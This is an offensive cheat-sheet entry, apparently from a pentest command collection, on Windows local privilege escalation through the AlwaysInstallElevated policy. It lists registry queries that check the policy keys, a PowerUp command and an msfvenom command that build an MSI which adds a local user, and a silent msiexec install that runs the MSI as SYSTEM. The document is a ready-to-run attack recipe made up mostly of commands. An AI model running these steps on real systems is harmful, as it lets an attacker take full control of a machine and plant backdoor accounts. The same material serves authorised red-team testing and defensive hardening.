---
technique: AlwaysInstallElevated
category: privilege-escalation
targets: Windows Workstation, Windows Server
protocols: Local
remote_capable: false
tags: windows lpe msi alwaysinstallelevated registry msiexec
---

# AlwaysInstallElevated

AlwaysInstallElevated is exploitable when both user and machine installer policy keys are set to `1`. In that state, a low-privileged user can run an MSI package with elevated privileges, commonly resulting in `NT AUTHORITY\SYSTEM` execution.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| HKCU policy | `AlwaysInstallElevated` must be set under the current user policy key |
| HKLM policy | `AlwaysInstallElevated` must be set under the machine policy key |
| MSI payload | The payload must be reachable from the target host |

## Windows

### Check HKCU policy

#cmd #registry

Check the user-level installer policy key.

```cmd title:"Check HKCU AlwaysInstallElevated policy"
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
<!-- cheat -->

### Check HKLM policy

#cmd #registry

Check the machine-level installer policy key.

```cmd title:"Check HKLM AlwaysInstallElevated policy"
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
<!-- cheat -->

### Create MSI with PowerUp

#powershell #powerup

Generate a user-add MSI with PowerUp in the current directory.

```powershell title:"Generate user-add MSI with PowerUp"
Write-UserAddMSI
```
<!-- cheat -->

### Install MSI

#cmd #msiexec

Install the MSI quietly to trigger elevated execution.

```cmd title:"Install MSI quietly with msiexec"
msiexec /quiet /qn /i "$msi_path"
```
<!-- cheat
var msi_path
-->

## Linux

### Build add-user MSI

#msfvenom #payload

Build an MSI that creates a local user.

```sh title:"Build add-user MSI payload"
msfvenom -p windows/adduser USER=$user PASS=$pass -f msi -o alwe.msi
```
<!-- cheat
import users
import passwords
-->
